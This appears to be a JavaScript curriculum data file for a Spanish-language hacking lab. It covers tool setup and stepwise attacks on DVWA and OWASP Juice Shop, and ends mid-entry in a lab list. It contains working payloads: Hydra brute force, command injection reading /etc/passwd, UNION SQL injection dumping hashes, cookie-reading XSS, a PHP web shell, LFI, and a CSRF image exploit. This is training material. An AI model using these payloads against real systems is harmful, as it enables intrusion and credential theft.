// Datos curriculares estructurados para cada laboratorio
// Cada paso responde de forma visual y directa a donde se hace, como se ejecuta y por que funciona.

// MODULO ESPECIAL: Instalacion y Preparacion de Herramientas
export const MODULO_INSTALACION = {
  id: 'instalacion-herramientas',
  esInstalacion: true,
  numero: 0,
  titulo: 'Instalacion y Preparacion de Herramientas',
  nivel: 'Basico',
  pasos: [
    {
      numero: 1,
      titulo: 'Requisitos previos del sistema',
      como: '1. Verifica que tu equipo tenga al menos 8 GB de RAM (recomendado 16 GB) y 40 GB de espacio libre.\n\n2. Necesitaras tener habilitada la virtualizacion por hardware en la BIOS/UEFI. En Windows: abre el Administrador de Tareas (Ctrl + Shift + Esc), ve a "Rendimiento" -> "CPU" y verifica que "Virtualizacion" aparezca como "Habilitado".\n\n3. Si la virtualizacion no esta habilitada: reinicia y accede a la BIOS (F2, F10, DEL o ESC al encender). Busca "Intel VT-x", "AMD-V" o "SVM Mode" y activala. Guarda y reinicia.',
      payload: 'CPU: Virtualizacion habilitada | RAM: >= 8 GB | Disco: >= 40 GB libres'
    },
    {
      numero: 2,
      titulo: 'Descarga e instalacion de VirtualBox',
      como: '1. Ve al sitio oficial: https://www.virtualbox.org/wiki/Downloads\n\n2. En "VirtualBox platform packages", haz clic en tu sistema operativo: "Windows hosts", "macOS hosts" o "Linux distributions".\n\n3. Ejecuta el instalador. En Windows: acepta el acuerdo, deja opciones por defecto, acepta instalar adaptadores de red virtuales, haz clic en "Install" y luego "Finish".\n\n4. Descarga tambien el "VirtualBox Extension Pack" desde la misma pagina. Instalalo desde VirtualBox: Archivo -> Preferencias -> Extensiones -> Agregar.',
      payload: 'https://www.virtualbox.org/wiki/Downloads'
    },
    {
      numero: 3,
      titulo: 'Descarga de Kali Linux (imagen OVA preconfigurada)',
      como: '1. Ve a: https://www.kali.org/get-kali/#kali-virtual-machines\n\n2. Busca la opcion "VirtualBox" y haz clic en descargar. El archivo .ova pesa aproximadamente 3-4 GB.\n\n3. Verifica el hash SHA256 del archivo. En Windows PowerShell:\n   Get-FileHash "ruta\\kali.ova" -Algorithm SHA256\n\n4. En VirtualBox ve a Archivo -> Importar servicio virtualizado, selecciona el .ova, revisa parametros con valores por defecto, y haz clic en "Importar". Puede tardar varios minutos.',
      payload: 'https://www.kali.org/get-kali/#kali-virtual-machines\nGet-FileHash "kali.ova" -Algorithm SHA256'
    },
    {
      numero: 4,
      titulo: 'Configuracion de la maquina virtual Kali Linux',
      como: '1. Selecciona la VM "Kali Linux" en VirtualBox y haz clic en "Configuracion" (engranaje).\n\n2. "Sistema" -> "Placa base": asigna al menos 2048 MB de RAM (o 4096 MB si tienes 16 GB).\n\n3. "Sistema" -> "Procesador": asigna al menos 2 CPUs y activa "Habilitar PAE/NX".\n\n4. "Pantalla" -> "Pantalla": memoria de video a 128 MB, activa "Habilitar aceleracion 3D".\n\n5. "Red" -> "Adaptador 1": modo "NAT" para acceso a internet. Si necesitas comunicacion con la Raspberry Pi en LAN, anade "Adaptador 2" en modo "Red solo anfitriun".\n\n6. Haz clic en "Aceptar".',
      payload: 'RAM: 2048-4096 MB | CPUs: 2+ | Video: 128 MB | Adaptador 1: NAT'
    },
    {
      numero: 5,
      titulo: 'Primer inicio de sesion en Kali Linux',
      como: '1. Selecciona la VM y haz clic en "Iniciar". Espera a que cargue el entorno grafico (1-2 minutos la primera vez).\n\n2. Usa las credenciales por defecto de la imagen OVA oficial:\n   - Usuario: kali\n   - Contrasena: kali\n\n3. Una vez dentro, abre una terminal (clic derecho en el escritorio -> "Open Terminal Here").\n\n4. Actualiza el sistema:\n   sudo apt update\n   sudo apt upgrade -y\n\n5. Ingresa la contrasena "kali" cuando se solicite. La actualizacion puede tardar varios minutos.',
      payload: 'Usuario: kali\nContrasena: kali\n\nsudo apt update && sudo apt upgrade -y'
    },
    {
      numero: 6,
      titulo: 'Instalacion de las Guest Additions de VirtualBox',
      como: '1. En terminal de Kali, instala los paquetes necesarios:\n   sudo apt install -y build-essential dkms linux-headers-$(uname -r)\n\n2. En el menu de VirtualBox (fuera de la VM), haz clic en "Dispositivos" -> "Insertar imagen de CD de las Guest Additions...".\n\n3. Si Kali no abre automaticamente el CD, ejecuta en terminal:\n   sudo mount /dev/cdrom /mnt\n   sudo /mnt/VBoxLinuxAdditions.run\n\n4. Reinicia la VM:\n   sudo reboot\n\n5. Despues del reinicio tendras pantalla completa (Ctrl+F), copiar-pegar entre anfitriun y Kali, y mejor rendimiento.',
      payload: 'sudo apt install -y build-essential dkms linux-headers-$(uname -r)\nsudo mount /dev/cdrom /mnt && sudo /mnt/VBoxLinuxAdditions.run\nsudo reboot'
    },
    {
      numero: 7,
      titulo: 'Descarga e instalacion de Burp Suite Community Edition',
      como: '1. Kali Linux ya incluye Burp Suite preinstalado. Para verificarlo, abre el menu de aplicaciones y busca "Burp Suite", o ejecuta en terminal: burpsuite\n\n2. Para la version mas reciente o instalarlo en el anfitriun Windows/macOS: ve a https://portswigger.net/burp/communitydownload\n\n3. Selecciona tu plataforma (Windows, macOS o Linux) y descarga el instalador. En Windows ejecuta el .exe con opciones por defecto.\n\n4. Al abrir Burp Suite por primera vez: "Temporary project" -> "Next" -> "Use Burp defaults" -> "Start Burp".\n\n5. La interfaz principal se abrira con las pestanas: Dashboard, Target, Proxy, Intruder, Repeater.',
      payload: 'En Kali Linux: burpsuite (preinstalado)\nhttps://portswigger.net/burp/communitydownload'
    },
    {
      numero: 8,
      titulo: 'Configuracion del Proxy Listener en Burp Suite',
      como: '1. En Burp Suite, haz clic en la pestana "Proxy" -> "Proxy Settings".\n\n2. En "Proxy Listeners", verifica que exista una entrada con "127.0.0.1" en puerto "8080" con la casilla activa (check verde).\n\n3. Si no existe, haz clic en "Add": "Bind to port" = 8080, "Bind to address" = "Loopback only" (127.0.0.1), luego "OK".\n\n4. Este proxy local interceptara todo el trafico HTTP/HTTPS que configure tu navegador para pasar por el.',
      payload: 'Host: 127.0.0.1 | Puerto: 8080 | Estado: Activo (check verde)'
    },
    {
      numero: 9,
      titulo: 'Descarga e instalacion del certificado CA de Burp Suite',
      como: '1. Con Burp Suite activo, configura el proxy manualmente en Firefox: Menu -> Ajustes -> busca "proxy" -> Configuracion de la conexion -> Configuracion manual -> HTTP Proxy: 127.0.0.1 / Puerto: 8080 -> marca "Usar este proxy para HTTPS" -> OK.\n\n2. En la barra de direcciones escribe: http://burpsuite y presiona Enter.\n\n3. Haz clic en "CA Certificate" para descargar "cacert.der".\n\n4. En Firefox: Menu -> Ajustes -> "certificados" -> Ver certificados -> pestana "Autoridades" -> Importar -> selecciona "cacert.der" -> marca "Confiar en esta CA para identificar sitios web" -> Aceptar.\n\n5. Vuelve a "Sin proxy" en Firefox, ya que FoxyProxy lo gestionara desde el siguiente paso.',
      payload: 'http://burpsuite -> Boton "CA Certificate" -> cacert.der\nFirefox: Ajustes -> Certificados -> Importar -> cacert.der'
    },
    {
      numero: 10,
      titulo: 'Instalacion y configuracion de FoxyProxy en Firefox',
      como: '1. En Firefox instala: https://addons.mozilla.org/firefox/addon/foxyproxy-standard/ -> "Anadir a Firefox" -> "Anadir".\n\n2. Haz clic en el icono de FoxyProxy en la barra de herramientas -> "Options".\n\n3. Haz clic en "Add" para crear un nuevo perfil:\n   - Title/Name: Burp\n   - Type: HTTP\n   - Hostname: 127.0.0.1\n   - Port: 8080\n   Haz clic en "Save".\n\n4. Para activar el proxy cuando uses Burp Suite: haz clic en FoxyProxy -> selecciona el perfil "Burp".\n\n5. Para desactivarlo: haz clic en FoxyProxy -> "Turn Off" o selecciona "Direct".',
      payload: 'Firefox Add-on: FoxyProxy Standard\nPerfil Burp: HTTP | 127.0.0.1 | Puerto 8080'
    },
    {
      numero: 11,
      titulo: 'Instalacion de Hydra en Kali Linux',
      como: '1. Hydra viene preinstalado en Kali Linux. Verifica con:\n   hydra --version\n\n2. Si no estuviera instalado:\n   sudo apt update && sudo apt install -y hydra\n\n3. Kali incluye rockyou.txt (wordlist de contrasenas). Para descomprimirla:\n   sudo gunzip /usr/share/wordlists/rockyou.txt.gz\n\n4. Verifica que este disponible:\n   ls -lh /usr/share/wordlists/rockyou.txt\n\n5. Para ver las opciones de Hydra: hydra -h\nUsaras Hydra en los laboratorios para atacar el modulo de Brute Force de DVWA.',
      payload: 'hydra --version\nsudo apt install -y hydra\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\nls -lh /usr/share/wordlists/rockyou.txt'
    },
    {
      numero: 12,
      titulo: 'Configuracion de red para alcanzar la Raspberry Pi',
      como: '1. La Raspberry Pi debe estar en la misma red que tu equipo (Ethernet o Wi-Fi al mismo router).\n\n2. Para encontrar la IP de la Raspberry Pi:\n   a) Conectar monitor+teclado a la Pi y ejecutar: hostname -I\n   b) Desde tu equipo: nmap -sn 192.168.1.0/24 (ajusta el rango segun tu red)\n   c) Revisar el panel de administracion de tu router\n\n3. Verifica conectividad desde tu equipo:\n   ping <IP_PI>\n\n4. Si la Pi responde, estas listo. Si no: verifica que esten en la misma red y que la Pi este encendida.\n\n5. Anota la IP. La usaras para configurar esta plataforma y para las URLs:\n   DVWA: http://<IP_PI>/dvwa/\n   Juice Shop: http://<IP_PI>:3000',
      payload: 'hostname -I\nnmap -sn 192.168.1.0/24\nping <IP_PI>\n\nDVWA: http://<IP_PI>/dvwa/\nJuice Shop: http://<IP_PI>:3000'
    },
    {
      numero: 13,
      titulo: 'Verificacion final: Prueba de intercepcion con Burp Suite',
      como: '1. Abre Burp Suite y verifica que el listener 127.0.0.1:8080 este activo.\n\n2. En Firefox, activa el perfil "Burp" en FoxyProxy (el icono cambia de color).\n\n3. En Burp Suite, ve a "Proxy" -> "Intercept" y verifica que diga "Intercept is on". Si dice "Intercept is off", haz clic para activarlo.\n\n4. En Firefox, navega a la URL de DVWA: http://<IP_PI>/dvwa/\n\n5. La peticion quedara interceptada en Burp Suite. Puedes examinar los encabezados HTTP, cookies y parametros.\n\n6. Haz clic en "Forward" para dejar pasar la peticion. DVWA debe cargar en el navegador.\n\n7. Para no interceptar pero si capturar en historial: desactiva "Intercept is off" pero mantén FoxyProxy activo y revisa "HTTP history".\n\nEntorno completamente configurado. Ya puedes comenzar los laboratorios.',
      payload: 'Proxy -> Intercept is on -> Navega a http://<IP_PI>/dvwa/ -> Forward\nHistorial: Proxy -> HTTP history'
    }
  ]
};

export const ROADMAP_MODULOS = {
  DVWA: {
    nombre: 'Damn Vulnerable Web Application (DVWA)',
    categoria: 'OWASP Top 10 Clasico',
    modulos: [
      {
        id: 'dvwa-brute-force',
        numero: 1,
        titulo: 'Fuerza Bruta en Autenticacion',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Inicio de sesion en DVWA y ajuste del nivel de seguridad',
            como: '1. Abre Firefox con FoxyProxy en modo "Burp" y navega a la URL de DVWA en tu Raspberry Pi.\n\n2. Escribe usuario "admin" y contrasena "password". Haz clic en "Login".\n\n3. En el menu lateral de DVWA, haz clic en "DVWA Security", selecciona "Low" en el menu desplegable y presiona "Submit". En este nivel no se aplicaran filtros de sanitizacion.',
            payload: 'Usuario: admin\nContrasena: password\nSecurity Level: Low'
          },
          {
            numero: 2,
            titulo: 'Capturar peticion de autenticacion',
            como: '1. En el menu lateral izquierdo de DVWA, haz clic en "Brute Force".\n\n2. Escribe cualquier nombre de usuario y contrasena de prueba.\n\n3. Asegurate de que en Burp Suite este activado "Intercept is on" y haz clic en "Login". Observa los parametros que viajan en la peticion HTTP GET.',
            payload: 'GET /dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login'
          },
          {
            numero: 3,
            titulo: 'Identificar mensaje de fallo',
            como: '1. En Burp Suite, pulsa "Forward" para enviar la peticion de prueba y revisa la respuesta del servidor.\n\n2. Observa que cuando las credenciales son erroneas, la aplicacion muestra "Username and/or password incorrect.".\n\n3. Esta cadena es la que utilizaran las herramientas automatizadas para saber cuando un intento fallo.',
            payload: 'Cadena de fallo: Username and/or password incorrect.'
          },
          {
            numero: 4,
            titulo: 'Lanzar ataque automatizado con Hydra',
            como: '1. DVWA usa una cookie llamada PHPSESSID para reconocer tu sesion.\n\n2. Para obtener su valor: con sesion iniciada en DVWA, presiona F12 -> "Aplicacion" (Chrome) o "Almacenamiento" (Firefox) -> "Cookies" -> busca la fila PHPSESSID y copia su valor.\n\n3. Abre la terminal de tu maquina Kali Linux y ejecuta el comando Hydra reemplazando <COOKIE> por el valor de PHPSESSID copiado.',
            payload: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_LAB> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: security=low; PHPSESSID=<COOKIE>"'
          }
        ]
      },
      {
        id: 'dvwa-command-injection',
        numero: 2,
        titulo: 'Inyeccion de Comandos del Sistema',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Verificar funcionamiento legitimo',
            como: '1. En el menu lateral izquierdo de DVWA, haz clic en "Command Injection".\n\n2. En el campo "Enter an IP address", escribe "127.0.0.1" y presiona "Submit".\n\n3. Veras la respuesta devuelta por el comando ping que el servidor ejecuto internamente en la Raspberry Pi.',
            payload: '127.0.0.1'
          },
          {
            numero: 2,
            titulo: 'Concatenar segundo comando con punto y coma',
            como: '1. Vuelve al campo "Enter an IP address".\n\n2. Escribe la direccion IP seguida de un punto y coma y el comando "whoami".\n\n3. Haz clic en "Submit". El punto y coma indica al SO que ejecute ambos comandos consecutivamente, imprimiendo el usuario del servidor web (www-data).',
            payload: '127.0.0.1; whoami'
          },
          {
            numero: 3,
            titulo: 'Extraer cuentas del sistema operativo',
            como: '1. En el mismo campo, introduce la secuencia para leer el archivo "/etc/passwd".\n\n2. Haz clic en "Submit".\n\n3. La aplicacion mostrara el listado completo de usuarios y cuentas de servicio del sistema operativo de la Raspberry Pi.',
            payload: '127.0.0.1; cat /etc/passwd'
          }
        ]
      },
      {
        id: 'dvwa-sqli',
        numero: 3,
        titulo: 'Inyeccion SQL',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Provocar fallo de sintaxis en la consulta',
            como: "1. En el menu lateral de DVWA, entra a \"SQL Injection\".\n\n2. En el campo \"User ID\", escribe unicamente una comilla simple ( ' ) y presiona \"Submit\".\n\n3. Observa el mensaje de error de MySQL: confirma que la entrada del usuario se inserta directamente en la consulta SQL sin estar parametrizada.",
            payload: "'"
          },
          {
            numero: 2,
            titulo: 'Evasion booleana de la condicion',
            como: '1. En el campo "User ID", escribe la sentencia de evasion booleana.\n\n2. Haz clic en "Submit".\n\n3. La condicion 1=1 siempre se cumple, por lo que la consulta ignorara el filtro de usuario y devolvera todos los usuarios de la base de datos.',
            payload: "1' OR '1'='1"
          },
          {
            numero: 3,
            titulo: 'Determinar numero de columnas con ORDER BY',
            como: '1. En "User ID", introduce la instruccion de ordenamiento para calcular cuantas columnas devuelve la consulta original.\n\n2. Prueba con numeros crecientes (1, 2, 3...) hasta que el servidor arroje un error.\n\n3. El numero que cause el error indicara el numero exacto de columnas para formular un UNION SELECT.',
            payload: "1' ORDER BY 2 #"
          },
          {
            numero: 4,
            titulo: 'Extraer usuarios y hashes de contrasenas',
            como: '1. Escribe en "User ID" el comando UNION SELECT solicitando las columnas "user" y "password" de la tabla "users".\n\n2. Haz clic en "Submit".\n\n3. El servidor combinara la respuesta y mostrara todos los nombres de usuario junto a sus contrasenas en formato hash MD5.',
            payload: "1' UNION SELECT user, password FROM users #"
          }
        ]
      },
      {
        id: 'dvwa-xss-reflected',
        numero: 4,
        titulo: 'Cross-Site Scripting Reflejado',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Identificar punto de reflexion de datos',
            como: '1. En el menu lateral de DVWA, haz clic en "XSS (Reflected)".\n\n2. En "What is your name?", escribe "PruebaLab" y presiona "Submit".\n\n3. Observa como el servidor imprime de regreso exactamente la palabra que enviaste ("Hello PruebaLab").',
            payload: 'PruebaLab'
          },
          {
            numero: 2,
            titulo: 'Inyectar codigo JavaScript ejecutable',
            como: '1. En el campo "What is your name?", introduce una etiqueta script con una funcion de alerta.\n\n2. Haz clic en "Submit".\n\n3. El navegador interpretara la etiqueta como JavaScript legitimo y desplegara un cuadro de alerta emergente con el texto "XSS".',
            payload: "<script>alert('XSS')</script>"
          },
          {
            numero: 3,
            titulo: 'Demostrar robo de cookie de sesion',
            como: '1. Introduce el payload para leer "document.cookie" en el campo "What is your name?".\n\n2. Presiona "Submit".\n\n3. El cuadro emergente mostrara el identificador de sesion actual (PHPSESSID), demostrando como un atacante podria secuestrar cuentas.',
            payload: '<script>alert(document.cookie)</script>'
          }
        ]
      },
      {
        id: 'dvwa-xss-stored',
        numero: 5,
        titulo: 'Cross-Site Scripting Almacenado',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Modificar limite de caracteres en el navegador',
            como: '1. En el menu lateral, haz clic en "XSS (Stored)".\n\n2. Clic derecho sobre la caja "Name" -> "Inspeccionar".\n\n3. En el arbol HTML, localiza el atributo maxlength="10" en la etiqueta input y cambialo a maxlength="200" para permitir payloads mas largos.',
            payload: 'maxlength="200"'
          },
          {
            numero: 2,
            titulo: 'Guardar el payload en la base de datos',
            como: '1. En el formulario "Guestbook", escribe el payload JavaScript en "Name" y cualquier texto en "Message".\n\n2. Haz clic en "Sign Guestbook".\n\n3. El servidor guardara permanentemente el codigo JavaScript en la base de datos MySQL de la Raspberry Pi.',
            payload: "Name: <script>alert('Stored')</script>\nMessage: Hola"
          },
          {
            numero: 3,
            titulo: 'Verificar persistencia del ataque',
            como: '1. Recarga la pagina con F5 o abre una ventana privada y visita la misma seccion.\n\n2. El script se ejecuta automaticamente cada vez que la pagina carga los comentarios, afectando a cualquier usuario que la visite.',
            payload: 'F5 / Recargar pagina'
          }
        ]
      },
      {
        id: 'dvwa-upload',
        numero: 6,
        titulo: 'Subida de Archivos y Web Shell',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Crear archivo Web Shell en PHP',
            como: '1. En tu maquina Kali Linux, abre un editor de texto (mousepad, gedit o nano).\n\n2. Escribe el codigo PHP que recibe parametros GET y los ejecuta en la funcion system().\n\n3. Guarda el archivo como "shell.php".',
            payload: '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>'
          },
          {
            numero: 2,
            titulo: 'Subir el archivo al servidor',
            como: '1. En el menu lateral de DVWA, haz clic en "File Upload".\n\n2. Pulsa "Examinar" y selecciona el archivo "shell.php".\n\n3. Presiona "Upload". La aplicacion confirmara que el archivo fue subido a hackable/uploads/.',
            payload: 'Archivo: shell.php'
          },
          {
            numero: 3,
            titulo: 'Ejecutar comandos en la Raspberry Pi',
            como: '1. En la barra de direcciones del navegador, ve a la ruta donde se alojo el archivo PHP subido.\n\n2. Anade "?cmd=" seguido del comando que quieras ejecutar (por ejemplo "id" o "uname -a").\n\n3. Veras la salida del comando con los privilegios del servidor web.',
            payload: 'http://<IP_LAB>/dvwa/hackable/uploads/shell.php?cmd=id'
          }
        ]
      },
      {
        id: 'dvwa-fi',
        numero: 7,
        titulo: 'Inclusion Local de Archivos (LFI)',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Analizar el parametro de inclusion',
            como: '1. En el menu lateral de DVWA, haz clic en "File Inclusion".\n\n2. Haz clic en cualquiera de los enlaces de ejemplo (como "file1.php") y observa la barra de direcciones.\n\n3. Nota como la pagina recibe el archivo a cargar a traves del parametro "?page=" en la URL.',
            payload: '?page=include.php'
          },
          {
            numero: 2,
            titulo: 'Escapar del directorio raiz (Path Traversal)',
            como: '1. Borra el valor de "?page=" y escribe multiples secuencias "../" seguidas de "/etc/passwd".\n\n2. Presiona Enter.\n\n3. Cada "../" retrocede un directorio hasta llegar a la raiz del sistema y mostrar el archivo de usuarios del sistema operativo.',
            payload: '?page=../../../../../../../../etc/passwd'
          },
          {
            numero: 3,
            titulo: 'Extraer codigo fuente con Wrapper Base64',
            como: '1. Escribe en "?page=" el wrapper php://filter/convert.base64-encode/resource=index.php\n\n2. Presiona Enter para recibir la cadena codificada en Base64.\n\n3. Decodifica la cadena para leer el codigo fuente original del archivo index.php.',
            payload: '?page=php://filter/convert.base64-encode/resource=index.php'
          }
        ]
      },
      {
        id: 'dvwa-csrf',
        numero: 8,
        titulo: 'Falsificacion de Peticiones (CSRF)',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Analizar peticion de cambio de contrasena',
            como: '1. En el menu lateral de DVWA, haz clic en "CSRF".\n\n2. Escribe una nueva contrasena en ambos campos y pulsa "Change".\n\n3. Revisa la barra de direcciones: la solicitud se envia por metodo GET sin ningun token de proteccion anti-CSRF.',
            payload: 'GET /dvwa/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change'
          },
          {
            numero: 2,
            titulo: 'Construir vector de ataque HTML',
            como: '1. Crea un archivo "exploit.html" con una etiqueta de imagen oculta apuntando a la URL de cambio de contrasena.\n\n2. Si una victima con sesion iniciada en DVWA abre este archivo, su navegador ejecutara la peticion automaticamente en segundo plano, cambiando su contrasena sin su consentimiento.',
            payload: '<img src="http://<IP_LAB>/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">'
          }
        ]
      }
    ]
  },
  'OWASP Juice Shop': {
    nombre: 'OWASP Juice Shop',
    categoria: 'SPA Moderna & API REST',
    modulos: [
      {
        id: 'juice-recon',
        numero: 1,
        titulo: 'Reconocimiento y Score Board',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Configurar filtro de trafico JSON en Burp y acceder a Juice Shop',
            como: '1. Con Burp Suite abierto y FoxyProxy en "Burp", navega a Juice Shop.\n\n2. En Burp Suite, ve a "Proxy" -> "HTTP history". Haz clic en la barra de filtros superior.\n\n3. Marca solo "JSON", "Fetch" y "XHR" y pulsa "Apply". Esto filtrara recursos estaticos y te enfocara en la API REST de Juice Shop.',
            payload: 'http://<IP_PI>:3000\nFiltro Burp: JSON / Fetch / XHR'
          },
          {
            numero: 2,
            titulo: 'Buscar ruta oculta del Score Board',
            como: '1. Con DevTools abierto (F12), abre la busqueda global con Ctrl + Shift + F.\n\n2. Escribe "score-board" y presiona Enter.\n\n3. Localiza la definicion de rutas del enrutador de Angular donde figura el componente del tablero de puntuacion.',
            payload: 'Buscar: score-board\nAtajo DevTools: Ctrl + Shift + F'
          },
          {
            numero: 3,
            titulo: 'Desbloquear panel de retos',
            como: '1. En la barra de direcciones del navegador con Juice Shop abierto, anade "/#/score-board" al final y presiona Enter.\n\n2. La aplicacion cargara el Score Board oficial.\n\n3. El servidor registrara automaticamente la resolucion de tu primer reto del laboratorio.',
            payload: 'http://<IP_LAB>/#/score-board'
          }
        ]
      },
      {
        id: 'juice-sqli',
        numero: 2,
        titulo: 'Inyeccion SQL en API JSON',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Interceptar peticion de login en Burp Suite',
            como: '1. En Juice Shop, haz clic en "Account" -> "Login".\n\n2. En Burp Suite, activa "Intercept is on".\n\n3. Escribe correo y contrasena de prueba y pulsa "Log in". En Burp veras la peticion POST al endpoint REST en formato JSON.',
            payload: 'POST /rest/user/login\n{"email":"test@test.com","password":"123"}'
          },
          {
            numero: 2,
            titulo: 'Bypass de autenticacion de Administrador',
            como: '1. En el campo "Email" del formulario, escribe el payload de escape SQL.\n\n2. Escribe cualquier texto ficticio en "Password".\n\n3. Haz clic en "Log in". La condicion OR 1=1 anulara la comprobacion de clave e iniciara sesion en la cuenta del Administrador.',
            payload: "' OR 1=1--"
          }
        ]
      },
      {
        id: 'juice-logic',
        numero: 3,
        titulo: 'Manipulacion de Logica de Negocio',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Capturar peticion de adicion al carrito',
            como: '1. En el catalogo de Juice Shop, activa "Intercept is on" en Burp Suite.\n\n2. Haz clic en "Add to Basket" de cualquier producto.\n\n3. Revisa en Burp la peticion POST enviada a "/api/BasketItems/" con "quantity: 1".',
            payload: 'POST /api/BasketItems/\n{"ProductId":1,"BasketId":"1","quantity":1}'
          },
          {
            numero: 2,
            titulo: 'Alterar cantidad a valor negativo',
            como: '1. En la pestana "Intercept" de Burp, modifica el parametro "quantity" de 1 a -5.\n\n2. Pulsa "Forward" para enviar la peticion modificada.\n\n3. Como el backend no valida cantidades negativas, el total de la cesta se reducira permitiendo compras gratuitas.',
            payload: '{"ProductId":1,"BasketId":"1","quantity":-5}'
          }
        ]
      },
      {
        id: 'juice-idor',
        numero: 4,
        titulo: 'Acceso No Autorizado e IDOR',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Localizar endpoint de la cesta',
            como: '1. En Juice Shop, haz clic en el icono del carrito de compras.\n\n2. Abre "Red" (Network) en DevTools (F12) o revisa el historial HTTP en Burp Suite.\n\n3. Identifica la peticion GET con un numero secuencial en la URL (por ejemplo, "/rest/basket/2").',
            payload: 'GET /rest/basket/2'
          },
          {
            numero: 2,
            titulo: 'Consultar cesta de otro usuario',
            como: '1. En Burp Suite, toma la peticion de la cesta y modifica el numero del final a 1.\n\n2. Envia la solicitud al servidor.\n\n3. Como la API no valida que la cesta pertenezca al usuario que la solicita, recibiras los datos de la cesta de otro usuario.',
            payload: 'GET /rest/basket/1'
          }
        ]
      },
      {
        id: 'juice-xss',
        numero: 5,
        titulo: 'Cross-Site Scripting en SPA',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Inyeccion en la barra de busqueda',
            como: '1. En Juice Shop, haz clic en el campo de busqueda de productos (icono lupa).\n\n2. Escribe el payload con la etiqueta iframe y codigo JavaScript.\n\n3. Presiona Enter. Al insertarse en el DOM sin sanitizacion, el navegador ejecutara el codigo mostrando la ventana de alerta.',
            payload: '<iframe src="javascript:alert(`XSS`)">'
          },
          {
            numero: 2,
            titulo: 'Inyeccion persistente en resenas de productos',
            como: '1. Inicia sesion y haz clic en cualquier producto del catalogo para abrir su ficha.\n\n2. Desplazate a la seccion "Reviews" (Resenas).\n\n3. En el campo de comentario, introduce el payload de script y pulsa "Submit". La resena maliciosa quedara almacenada y se ejecutara para todos los usuarios que visiten ese producto.',
            payload: '<<SCRIPT>alert("XSS");//<</SCRIPT>'
          }
        ]
      }
    ]
  }
};

export const RUTA_GLOBAL_TEMATICAS = [
  {
    orden: 1,
    fase: 1,
    faseTitulo: 'Fase 1 · Autenticacion y Reconocimiento',
    faseNivel: 'Basico',
    faseIcono: 'lock',
    id: 'juice-recon',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-recon',
    titulo: 'Busqueda de Rutas y Secciones Ocultas',
    categoria: 'Reconocimiento',
    nivel: 'Basico',
    descripcion: 'Aprenderas a revisar el codigo fuente de una pagina para descubrir enlaces ocultos y desbloquear el panel oficial de retos del laboratorio.',
    duracionEstimada: '10 min',
    tags: ['Recon', 'Rutas Ocultas', 'Score Board'],
  },
  {
    orden: 2,
    fase: 1,
    faseTitulo: 'Fase 1 · Autenticacion y Reconocimiento',
    faseNivel: 'Basico',
    faseIcono: 'lock',
    id: 'dvwa-brute-force',
    lab: 'DVWA',
    moduloId: 'dvwa-brute-force',
    titulo: 'Pruebas Automaticas de Contrasenas',
    categoria: 'Autenticacion',
    nivel: 'Basico',
    descripcion: 'Entendreras como se prueban miles de contrasenas de forma automatica con programas como Hydra y por que es vital usar claves seguras.',
    duracionEstimada: '15 min',
    tags: ['Hydra', 'Fuerza Bruta', 'Cookies de Sesion'],
  },
  {
    orden: 3,
    fase: 1,
    faseTitulo: 'Fase 1 · Autenticacion y Reconocimiento',
    faseNivel: 'Basico',
    faseIcono: 'lock',
    id: 'dvwa-xss-reflected',
    lab: 'DVWA',
    moduloId: 'dvwa-xss-reflected',
    titulo: 'Inyeccion de Codigo en Formularios (XSS)',
    categoria: 'Inyeccion Web (XSS)',
    nivel: 'Basico',
    descripcion: 'Aprenderas que ocurre cuando una pagina no revisa lo que escribe el usuario, permitiendo que se ejecute codigo no autorizado en el navegador.',
    duracionEstimada: '15 min',
    tags: ['XSS Reflected', 'JavaScript Injection', 'document.cookie'],
  },
  {
    orden: 4,
    fase: 1,
    faseTitulo: 'Fase 1 · Autenticacion y Reconocimiento',
    faseNivel: 'Basico',
    faseIcono: 'lock',
    id: 'juice-sqli',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-sqli',
    titulo: 'Entrada sin Contrasena (Inyeccion SQL Basica)',
    categoria: 'Inyeccion SQL',
    nivel: 'Basico',
    descripcion: 'Descubriras como un fallo al consultar la base de datos permite iniciar sesion en la cuenta del administrador sin saber su contrasena.',
    duracionEstimada: '15 min',
    tags: ['SQL Injection', 'Auth Bypass', 'API REST', 'SQLite'],
  },
  {
    orden: 5,
    fase: 2,
    faseTitulo: 'Fase 2 · Vulnerabilidades en Servidor y Backend',
    faseNivel: 'Intermedio',
    faseIcono: 'server',
    id: 'dvwa-command-injection',
    lab: 'DVWA',
    moduloId: 'dvwa-command-injection',
    titulo: 'Control del Servidor mediante Comandos',
    categoria: 'Command Injection',
    nivel: 'Intermedio',
    descripcion: 'Aprenderas como un formulario mal protegido puede ser manipulado para ejecutar ordenes del sistema directamente en el servidor.',
    duracionEstimada: '20 min',
    tags: ['OS Commands', 'Linux Shell', 'Concatenacion ;'],
  },
  {
    orden: 6,
    fase: 2,
    faseTitulo: 'Fase 2 · Vulnerabilidades en Servidor y Backend',
    faseNivel: 'Intermedio',
    faseIcono: 'server',
    id: 'dvwa-sqli',
    lab: 'DVWA',
    moduloId: 'dvwa-sqli',
    titulo: 'Extraccion de Usuarios y Claves Guardadas',
